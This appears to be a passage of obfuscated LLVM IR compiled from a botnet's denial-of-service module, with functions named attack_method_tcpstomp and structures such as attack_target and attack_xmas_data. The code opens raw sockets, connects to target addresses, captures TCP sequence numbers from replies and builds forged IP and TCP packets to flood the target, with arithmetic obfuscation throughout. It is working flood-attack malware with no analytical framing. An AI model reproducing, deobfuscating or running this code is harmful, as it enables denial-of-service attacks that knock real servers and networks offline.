  store i16 %605, i16* %607, align 4
  %608 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %609 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %608, i32 0, i32 1
  %610 = load i16, i16* %609, align 2
  %611 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %612 = load i32, i32* %9, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %611, i64 %613
  %615 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %614, i32 0, i32 0
  %616 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %615, i32 0, i32 1
  store i16 %610, i16* %616, align 2
  %617 = load i32, i32* %10, align 4
  %618 = load i8*, i8** %32, align 8
  %619 = load i32, i32* %26, align 4
  %620 = sext i32 %619 to i64
  %621 = sub i64 0, 40
  %622 = sub i64 0, %620
  %623 = add i64 %621, %622
  %624 = sub i64 0, %623
  %625 = add i64 40, %620
  %626 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %627 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %628 = load i32, i32* %9, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %627, i64 %629
  %631 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %630, i32 0, i32 0
  %632 = bitcast %struct.sockaddr_in* %631 to %struct.sockaddr*
  store %struct.sockaddr* %632, %struct.sockaddr** %626, align 8
  %633 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %634 = load %struct.sockaddr*, %struct.sockaddr** %633, align 8
  %635 = call i64 @sendto(i32 %617, i8* %618, i64 %624, i32 16384, %struct.sockaddr* %634, i32 16)
  br label %636

; <label>:636:                                    ; preds = %577
  %637 = load i32, i32* %9, align 4
  %638 = sub i32 0, %637
  %639 = sub i32 0, 1
  %640 = add i32 %638, %639
  %641 = sub i32 0, %640
  %642 = add nsw i32 %637, 1
  store i32 %641, i32* %9, align 4
  br label %447

; <label>:643:                                    ; preds = %447
  br label %446

; <label>:644:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_xmas_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #7
  %47 = bitcast i8* %46 to %struct.attack_xmas_data*
  store %struct.attack_xmas_data* %47, %struct.attack_xmas_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #7
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %862

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #7
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %862

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %724, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %731

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %719, %705, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %724

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = and i32 %128, 2048
  %130 = xor i32 %128, 2048
  %131 = or i32 %129, %130
  %132 = or i32 %128, 2048
  %133 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %131)
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %134, align 4
  %135 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 2
  %140 = load i8, i8* %139, align 4
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %141, 32
  br i1 %142, label %143, label %167

; <label>:143:                                    ; preds = %125
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @ntohl(i32 %149) #8
  %151 = call i32 @rand_next()
  %152 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 2
  %157 = load i8, i8* %156, align 4
  %158 = zext i8 %157 to i32
  %159 = lshr i32 %151, %158
  %160 = sub i32 %150, -1755618259
  %161 = add i32 %160, %159
  %162 = add i32 %161, -1755618259
  %163 = add i32 %150, %159
  %164 = call i32 @htonl(i32 %162) #8
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %166 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %165, i32 0, i32 0
  store i32 %164, i32* %166, align 4
  br label %176

; <label>:167:                                    ; preds = %125
  %168 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %175 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %174, i32 0, i32 0
  store i32 %173, i32* %175, align 4
  br label %176

; <label>:176:                                    ; preds = %167, %143
  %177 = load i16, i16* %17, align 2
  %178 = zext i16 %177 to i32
  %179 = icmp eq i32 %178, 65535
  br i1 %179, label %180, label %192

; <label>:180:                                    ; preds = %176
  %181 = call i32 @rand_next()
  %182 = xor i32 %181, -1
  %183 = xor i32 65535, -1
  %184 = xor i32 -1289665815, -1
  %185 = or i32 %182, %183
  %186 = or i32 -1289665815, %184
  %187 = xor i32 %185, -1
  %188 = and i32 %187, %186
  %189 = and i32 %181, 65535
  %190 = trunc i32 %188 to i16
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %190, i16* %191, align 2
  br label %196

; <label>:192:                                    ; preds = %176
  %193 = load i16, i16* %17, align 2
  %194 = call zeroext i16 @htons(i16 zeroext %193) #8
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %194, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %192, %180
  %197 = load i32, i32* %26, align 4
  %198 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %199 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %199, %struct.sockaddr** %198, align 8
  %200 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %201 = load %struct.sockaddr*, %struct.sockaddr** %200, align 8
  %202 = call i32 @connect(i32 %197, %struct.sockaddr* %201, i32 16)
  %203 = call i64 @time(i64* null) #7
  store i64 %203, i64* %31, align 8
  br label %204

; <label>:204:                                    ; preds = %722, %196
  store i32 16, i32* %29, align 4
  %205 = load i32, i32* %10, align 4
  %206 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %207 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %208 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %208, %struct.sockaddr** %207, align 8
  %209 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %210 = load %struct.sockaddr*, %struct.sockaddr** %209, align 8
  %211 = call i64 @recvfrom(i32 %205, i8* %206, i64 256, i32 16384, %struct.sockaddr* %210, i32* %29)
  %212 = trunc i64 %211 to i32
  store i32 %212, i32* %33, align 4
  %213 = load i32, i32* %33, align 4
  %214 = icmp eq i32 %213, -1
  br i1 %214, label %215, label %216

; <label>:215:                                    ; preds = %204
  br label %862

; <label>:216:                                    ; preds = %204
  %217 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %218 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 4
  %220 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %221 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %220, i32 0, i32 0
  %222 = load i32, i32* %221, align 4
  %223 = icmp eq i32 %219, %222
  br i1 %223, label %224, label %711

; <label>:224:                                    ; preds = %216
  %225 = load i32, i32* %33, align 4
  %226 = sext i32 %225 to i64
  %227 = icmp ugt i64 %226, 40
  br i1 %227, label %228, label %711

; <label>:228:                                    ; preds = %224
  %229 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %230 = getelementptr inbounds i8, i8* %229, i64 20
  %231 = bitcast i8* %230 to %struct.tcphdr*
  store %struct.tcphdr* %231, %struct.tcphdr** %35, align 8
  %232 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = load i16, i16* %233, align 4
  %235 = zext i16 %234 to i32
  %236 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %237 = load i16, i16* %236, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %235, %238
  br i1 %239, label %240, label %710

; <label>:240:                                    ; preds = %228
  %241 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = lshr i16 %243, 9
  %245 = xor i16 %244, -1
  %246 = xor i16 1, -1
  %247 = xor i16 15239, -1
  %248 = or i16 %245, %246
  %249 = or i16 15239, %247
  %250 = xor i16 %248, -1
  %251 = and i16 %250, %249
  %252 = and i16 %244, 1
  %253 = zext i16 %251 to i32
  %254 = icmp ne i32 %253, 0
  br i1 %254, label %255, label %679

; <label>:255:                                    ; preds = %240
  %256 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 4
  %258 = load i16, i16* %257, align 4
  %259 = lshr i16 %258, 12
  %260 = xor i16 %259, -1
  %261 = xor i16 1, -1
  %262 = xor i16 -9095, -1
  %263 = or i16 %260, %261
  %264 = or i16 -9095, %262
  %265 = xor i16 %263, -1
  %266 = and i16 %265, %264
  %267 = and i16 %259, 1
  %268 = zext i16 %266 to i32
  %269 = icmp ne i32 %268, 0
  br i1 %269, label %270, label %679

; <label>:270:                                    ; preds = %255
  %271 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %272 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %271, i32 0, i32 0
  %273 = load i32, i32* %272, align 4
  %274 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %275 = load i32, i32* %9, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %274, i64 %276
  %278 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %277, i32 0, i32 0
  store i32 %273, i32* %278, align 4
  %279 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %280 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %279, i32 0, i32 2
  %281 = load i32, i32* %280, align 4
  %282 = call i32 @ntohl(i32 %281) #8
  %283 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %284 = load i32, i32* %9, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %283, i64 %285
  %287 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %286, i32 0, i32 1
  store i32 %282, i32* %287, align 4
  %288 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %289 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %288, i32 0, i32 3
  %290 = load i32, i32* %289, align 4
  %291 = call i32 @ntohl(i32 %290) #8
  %292 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %295, i32 0, i32 2
  store i32 %291, i32* %296, align 4
  %297 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 1
  %299 = load i16, i16* %298, align 2
  %300 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %301 = load i32, i32* %9, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %300, i64 %302
  %304 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %303, i32 0, i32 3
  store i16 %299, i16* %304, align 4
  %305 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %306 = load i16, i16* %305, align 2
  %307 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %308 = load i32, i32* %9, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %307, i64 %309
  %311 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %310, i32 0, i32 4
  store i16 %306, i16* %311, align 2
  %312 = load i32, i32* %24, align 4
  %313 = sext i32 %312 to i64
  %314 = sub i64 0, %313
  %315 = sub i64 40, %314
  %316 = add i64 40, %313
  %317 = call noalias i8* @malloc(i64 %315) #7
  %318 = load i8**, i8*** %12, align 8
  %319 = load i32, i32* %9, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds i8*, i8** %318, i64 %320
  store i8* %317, i8** %321, align 8
  %322 = load i8**, i8*** %12, align 8
  %323 = load i32, i32* %9, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds i8*, i8** %322, i64 %324
  %326 = load i8*, i8** %325, align 8
  %327 = bitcast i8* %326 to %struct.iphdr*
  store %struct.iphdr* %327, %struct.iphdr** %36, align 8
  %328 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i64 1
  %330 = bitcast %struct.iphdr* %329 to %struct.tcphdr*
  store %struct.tcphdr* %330, %struct.tcphdr** %37, align 8
  %331 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %332 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %331, i64 1
  %333 = bitcast %struct.tcphdr* %332 to i8*
  store i8* %333, i8** %38, align 8
  %334 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %335 = bitcast %struct.iphdr* %334 to i8*
  %336 = load i8, i8* %335, align 4
  %337 = xor i8 15, -1
  %338 = xor i8 %336, %337
  %339 = and i8 %338, %336
  %340 = and i8 %336, 15
  %341 = xor i8 %339, -1
  %342 = xor i8 64, -1
  %343 = xor i8 -96, -1
  %344 = and i8 %341, -96
  %345 = and i8 %339, %343
  %346 = and i8 %342, -96
  %347 = and i8 64, %343
  %348 = or i8 %344, %345
  %349 = or i8 %346, %347
  %350 = xor i8 %348, %349
  %351 = or i8 %341, %342
  %352 = xor i8 %351, -1
  %353 = or i8 -96, %343
  %354 = and i8 %352, %353
  %355 = or i8 %350, %354
  %356 = or i8 %339, 64
  store i8 %355, i8* %335, align 4
  %357 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %358 = bitcast %struct.iphdr* %357 to i8*
  %359 = load i8, i8* %358, align 4
  %360 = xor i8 -16, -1
  %361 = xor i8 %359, %360
  %362 = and i8 %361, %359
  %363 = and i8 %359, -16
  %364 = and i8 %362, 5
  %365 = xor i8 %362, 5
  %366 = or i8 %364, %365
  %367 = or i8 %362, 5
  store i8 %366, i8* %358, align 4
  %368 = load i8, i8* %13, align 1
  %369 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %370 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %369, i32 0, i32 1
  store i8 %368, i8* %370, align 1
  %371 = load i32, i32* %24, align 4
  %372 = sext i32 %371 to i64
  %373 = sub i64 40, -646766251303942967
  %374 = add i64 %373, %372
  %375 = add i64 %374, -646766251303942967
  %376 = add i64 40, %372
  %377 = trunc i64 %375 to i16
  %378 = call zeroext i16 @htons(i16 zeroext %377) #8
  %379 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i32 0, i32 2
  store i16 %378, i16* %380, align 2
  %381 = load i16, i16* %14, align 2
  %382 = call zeroext i16 @htons(i16 zeroext %381) #8
  %383 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i32 0, i32 3
  store i16 %382, i16* %384, align 4
  %385 = load i8, i8* %15, align 1
  %386 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %387 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %386, i32 0, i32 5
  store i8 %385, i8* %387, align 4
  %388 = load i8, i8* %16, align 1
  %389 = icmp ne i8 %388, 0
  br i1 %389, label %390, label %394

; <label>:390:                                    ; preds = %270
  %391 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %392 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 4
  store i16 %391, i16* %393, align 2
  br label %394

; <label>:394:                                    ; preds = %390, %270
  %395 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i32 0, i32 6
  store i8 6, i8* %396, align 1
  %397 = load i32, i32* @LOCAL_ADDR, align 4
  %398 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 8
  store i32 %397, i32* %399, align 4
  %400 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %401 = load i32, i32* %9, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %400, i64 %402
  %404 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %403, i32 0, i32 0
  %405 = load i32, i32* %404, align 4
  %406 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 9
  store i32 %405, i32* %407, align 4
  %408 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %411, i32 0, i32 3
  %413 = load i16, i16* %412, align 4
  %414 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 0
  store i16 %413, i16* %415, align 4
  %416 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %417 = load i32, i32* %9, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %416, i64 %418
  %420 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %419, i32 0, i32 4
  %421 = load i16, i16* %420, align 2
  %422 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %423 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %422, i32 0, i32 1
  store i16 %421, i16* %423, align 2
  %424 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %425 = load i32, i32* %9, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %424, i64 %426
  %428 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %427, i32 0, i32 2
  %429 = load i32, i32* %428, align 4
  %430 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %431 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %430, i32 0, i32 2
  store i32 %429, i32* %431, align 4
  %432 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %433 = load i32, i32* %9, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %435, i32 0, i32 1
  %437 = load i32, i32* %436, align 4
  %438 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %439 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %438, i32 0, i32 3
  store i32 %437, i32* %439, align 4
  %440 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %441 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %440, i32 0, i32 4
  %442 = load i16, i16* %441, align 4
  %443 = xor i16 -241, -1
  %444 = xor i16 %442, %443
  %445 = and i16 %444, %442
  %446 = and i16 %442, -241
  %447 = and i16 %445, 128
  %448 = xor i16 %445, 128
  %449 = or i16 %447, %448
  %450 = or i16 %445, 128
  store i16 %449, i16* %441, align 4
  %451 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 4
  %453 = load i16, i16* %452, align 4
  %454 = xor i16 %453, -1
  %455 = xor i16 -257, -1
  %456 = xor i16 18159, -1
  %457 = or i16 %454, %455
  %458 = or i16 18159, %456
  %459 = xor i16 %457, -1
  %460 = and i16 %459, %458
  %461 = and i16 %453, -257
  %462 = xor i16 %460, -1
  %463 = xor i16 256, -1
  %464 = xor i16 -2382, -1
  %465 = and i16 %462, -2382
  %466 = and i16 %460, %464
  %467 = and i16 %463, -2382
  %468 = and i16 256, %464
  %469 = or i16 %465, %466
  %470 = or i16 %467, %468
  %471 = xor i16 %469, %470
  %472 = or i16 %462, %463
  %473 = xor i16 %472, -1
  %474 = or i16 -2382, %464
  %475 = and i16 %473, %474
  %476 = or i16 %471, %475
  %477 = or i16 %460, 256
  store i16 %476, i16* %452, align 4
  %478 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
